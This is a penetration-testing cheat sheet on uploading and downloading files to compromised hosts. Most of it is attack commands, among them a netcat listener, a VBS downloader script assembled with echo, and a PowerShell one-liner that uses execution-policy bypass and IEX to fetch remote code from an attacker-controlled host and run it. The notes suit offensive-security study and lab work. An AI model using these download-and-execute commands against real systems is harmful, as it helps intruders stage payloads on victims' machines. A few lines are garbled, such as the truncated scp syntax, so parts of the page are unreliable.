# Upload & download

* Static binaries : [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

**Create a web server**

**HTTP server on your workstation:**

* `python -m SimpleHTTPServer <PORT>`
* `sudo service apache2 start`
  * Expose the `/var/www/html` folder

**HTTPS server on your workstation:**

* Generate the certificate : `openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes`
* Python script for an HTTPS server on port 4443

```
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

* `python https-server.py`
* Source : [https://gist.github.com/dergachev/7028596](https://gist.github.com/dergachev/7028596)

**PHP**

* `php -S <IP>:<PORT> -t .`

**Raw socket**

* `nc -nlvp <PORT>`

**Upload & Download command lines**

**VBS**

```vbnet
echo str_Url = WScript.Arguments.Item(0) > my_dwld_script.vbs
echo str_File = WScript.Arguments.Item(1) >> my_dwld_script.vbs
echo onst HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> my_dwld_script.vbs
echo Dim http, var_ByteArray, str_Data, str_Buffer, lng_Counter, fs, ts >> my_dwld_script.vbs
echo Err.Clear >> my_dwld_script.vbs
echo Set http = Nothing >> my_dwld_script.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> my_dwld_script.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> my_dwld_script.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> my_dwld_script.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> my_dwld_script.vbs
echo http.Open "GET", str_Url, False >> my_dwld_script.vbs
echo http.Send >> my_dwld_script.vbs
echo var_ByteArray = http.ResponseBody >> my_dwld_script.vbs
echo Set http = Nothing >> my_dwld_script.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> my_dwld_script.vbs
echo Set ts = fs.CreateTextFile(str_File, True) >> my_dwld_script.vbs
echo str_Data = "" >> my_dwld_script.vbs
echo str_Buffer = "" >> my_dwld_script.vbs
echo For lng_Counter = 0 to UBound(var_ByteArray) >> my_dwld_script.vbs
echo ts.Write Chr(255 And Ascb(Midb(var_ByteArray,lng_Counter + 1, 1))) >> my_dwld_script.vbs
echo Next >> my_dwld_script.vbs
echo ts.Close >> my_dwld_script.vbs 
```

* `C:\WINDOWS\Temp>cscript my_dwld_script.vbs http://<IP>:<PORT>/<REMOTE-FILE> <LOCAL-FILE>`

**Powershell**

* `Powershell.exe -NoP -NonI -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')`
* Add the name of the function you want to call at the end of the file, to call it automatically

**FTP**

* To upload on the target device use `put` do not forget to set the **mode** before download **binary** or **ascii**

**SSH**

* Download : scp @: .
* Upload : scp @:\<REMOTE\_PATH>

**Upload on a Linux target from your Kali:**

* curl
* wget
